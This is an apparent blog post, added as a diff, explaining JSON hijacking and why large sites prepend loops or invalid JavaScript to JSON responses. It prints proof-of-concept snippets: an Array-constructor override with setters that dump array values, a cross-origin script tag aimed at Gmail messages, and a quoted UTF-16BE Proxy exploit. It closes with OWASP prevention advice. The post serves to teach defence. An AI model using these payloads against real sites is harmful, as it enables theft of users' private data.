@@ -1,0 +1,236 @@
+---
+title: "Why Facebook's api starts with a for loop"
+description: "The curious case of JSON hijacking"
+publishDate: 2018-11-13
+updatedDate: 2020-07-07
+tags:
+  - javascript
+  - security
+draft: false
+---
+
+If you ever inspected your requests to big company's API's in the browser, you might have noticed some weird javascript before the JSON itself:
+
+> Facebook ![Facebook](/images/blog/0ilzmxjo89zo3xcchd09.png)
+
+> Gmail ![Facebook](/images/blog/x0kj3nle3typ7ctp4hdv.png)
+
+Why would they waste few bytes to invalidate this JSON?
+
+# To protect your data
+
+Without those important bytes, it could be possible for any website to access this data.
+
+This vulnerability is called [JSON hijacking](https://duckduckgo.com/?q=json+hijacking), and allows websites to extract the JSON data from those API's.
+
+## Origins
+
+In JavaScript 1.5 and earlier versions, it was possible to override Primitive Object's constructor, and have this overwritten version called when using bracket notations.
+
+This means you could do:
+
+```javascript
+function Array() {
+  alert("You created an array!");
+}
+var x = [1, 2, 3];
+```
+
+And the alert would popup!
+
+Replace the `var x` with the following script, and the attacker could read your emails!  
+This works by overwriting the `Array` constructor before loading an external script.
+
+```html
+<script src="https://gmail.com/messages"></script>
+```
+
+## Data extraction
+
+Even though you're overriding the constructor, the array is still constructed and you can still access it via `this`.
+
+Here is a snippet which will alert all of the array data:
+
+```javascript
+function Array() {
+  var that = this;
+  var index = 0;
+  // Populating the array with setters, which dump the value when called
+  var valueExtractor = function (value) {
+    // Alert the value
+    alert(value);
+    // Set the next index to use this method as well
+    that.__defineSetter__(index.toString(), valueExtractor);
+    index++;
+  };
+  // Set the setter for item 0
+  that.__defineSetter__(index.toString(), valueExtractor);
+  index++;
+}
+```
+
+Upon creating arrays, their values will be alerted!
+
+This was fixed in the _ECMAScript 4_ proposal, as we now can no longer override the prototype of most primitives, such as `Object` and `Array`.
+
+Even though ES4 was never released, this vulnerability was fixed by major browsers soon after its discovery.
+
+---
+
+You can still have similar behavior in today's javascript, but it is limited to variables you create, or item creations not using the bracket notation.
+
+This would be the adapted version of the previous payload:
+
+```javascript
+// Making an array
+const x = [];
+
+// Making the overwritten methods
+x.copy = [];
+const extractor = (v) => {
+  // Keeping the value in a different array
+  x.copy.push(v);
+  // Setting the extractor for the next value
+  const currentIndex = x.copy.length;
+  x.__defineSetter__(currentIndex, extractor);
+  x.__defineGetter__(currentIndex, () => x.copy[currentIndex]);
+  // Logging the value
+  console.log("Extracted value", v);
+};
+
+// Assigning the setter on index 0
+x.__defineSetter__(0, extractor);
+x.__defineGetter__(0, () => x.copy[0]);
+
+// Using the array as usual
+
+x[0] = "zero";
+x[1] = "one";
+
+console.log(x[0]);
+console.log(x[1]);
+```
+
+And this would be a version using the `Array` keyword to create your array:
+
+```javascript
+function Array() {
+  console.log(arguments);
+}
+
+Array("secret", "values");
+```
+
+As you can see, the data you added to the array was logged, while the functionality remains the same!
+
+---
+
+The fix itself was not to block the `function Array` creation in itself, but to force the bracket notation of item creations to use the native implementation, and not your custom function.
+
+This means we can still create an `Array` function, but it won't be called with square brackets array creations (`[1,2,3]`).  
+It still will be called if we use the `x = new Array(1,2,3)` or `x = Array(1,2,3)` notation though, but this doesn't impact JSON hijacking.
+
+# Modern variations
+
+Alright, so we know old versions of browsers were vulnerable a while ago.
+What does this mean for us today?
+
+Well, with the recent release of EcmaScript 6, new juicy features were added such as Proxies!
+
+[Gareth Heyes](https://twitter.com/garethheyes) from Portswigger [blogged out](https://portswigger.net/blog/json-hijacking-for-the-modern-web) out a modern variation of this attack, which still lets us steal data from JSON endpoints!
+
+Using Proxies instead of Accessors lets us steal any variable created, no matter what its name is.
+It can behave like an accessor but for any accessed or written property.
+
+Using this and another quirk, it is possible to steal data once again!
+
+> UTF-16BE is a multi-byte charset and so two bytes will actually form one character. If for example your script starts with [" this will be treated as the character 0x5b22 not 0x5b 0x22. 0x5b22 happens to be a valid JavaScript variable =). Can you see where this is going?
+
+Using such a script:
+
+```html
+<script charset="UTF-16BE" src="external-script-with-array-literal"></script>
+```
+
+With a bit of controlled data from this script, as well as the practical bit-shifting script to make this legible again, we can exfiltrate data once again!
+
+Here is his final edge POC, taken from his blog post:
+
+```javascript
+<!doctype HTML>
+<script>
+Object.setPrototypeOf(__proto__,new Proxy(__proto__,{
+    has:function(target,name){
+        alert(name.replace(/./g,function(c){ c=c.charCodeAt(0);return String.fromCharCode(c>>8,c&0xff); }));
+    }
+}));
+</script>
+<script charset="UTF-16BE" src="external-script-with-array-literal"></script>
+<!-- script contains the following response: ["supersecret","<?php echo chr(0)?>aa"] -->
+```
+
+As I won't explain his method in depth, I strongly suggest you to read [his post](https://portswigger.net/blog/json-hijacking-for-the-modern-web) for more information.
+
+# Prevention
+
+Here are the official OWASP recommendations, taken from their [AJAX security cheat sheet](https://www.owasp.org/index.php/AJAX_Security_Cheat_Sheet#Always_return_JSON_with_an_Object_on_the_outside)
+
+- Use CSRF Protection
+  This prevents the exploit by not returning the data if a security header or csrf token is missing.
+
+- Always return JSON with an Object on the outside
+
+This last solution is interesting.
+
+In Firefox and IE, this is valid:
+
+```javascript
+x = [{ key: "value" }];
+x = { key: "value" }[{ key: "value" }];
+{
+  key: "value";
+}
+```
+
+But this isn't:
+
+```javascript
+{"key":"value"}
+```
+
+The reason why it is not valid is that browsers considers the brackets to be the start of a block statement, and not an object creation.
+The notation without quotes, `{key: "value"}`, is considered a label, with the value being a statement.
+
+[See edit: This is wrong] Chrome, unlike the others, considers those cases to be an object creation, and therefore it creates a new object.
+
+Thanks [Matt (r0x33d)](https://twitter.com/r0x33d) for the help demystifying this!
+
+Update: [Mathias Bynens](https://twitter.com/mathias/) from the V8 team pointed this out:
+
+> But the DevTools implicitly wrap your input code to make this work.
+
+This can be tested by `eval`uating the code instead of simply running it:
+
+```javascript
+eval('{"x":"y"}');
+```
+
+This throws the same error on all browsers.
+
+Chrome therefore correctly handles this input when in a raw script tag, even though the dev tools console might not have the same behavior.
+
+# Conclusion
+
+While those vectors may not be working today, we never know what new bug tomorrow will bring, and therefore we should still do our best to prevent API's from being exploitable.
+If we took [this StackOverflow answer](https://stackoverflow.com/questions/16289894/is-json-hijacking-still-an-issue-in-modern-browsers) answer for granted, we would have been vulnerable to the modern variants, and therefore still possibly hacked.
+
+Google and Facebook's answer has been to add invalid javascript or infinite loops before their JSON data, but there are few other alternatives as listed by OWASP.
+
+# References:
+
+[Haacked.com - JSON Highjacking](https://haacked.com/archive/2009/06/25/json-hijacking.aspx/)
+
+[Stackoverflow - Why does google prepend [a loop] to their JSON responses](https://stackoverflow.com/questions/2669690/why-does-google-prepend-while1-to-their-json-responses)
+
+[Portswigger - JSON highjacking for the modern web](https://portswigger.net/blog/json-hijacking-for-the-modern-web)
+[And the slides of Gareth Heyes](https://www.owasp.org/images/6/6a/OWASPLondon20161124_JSON_Hijacking_Gareth_Heyes.pdf)
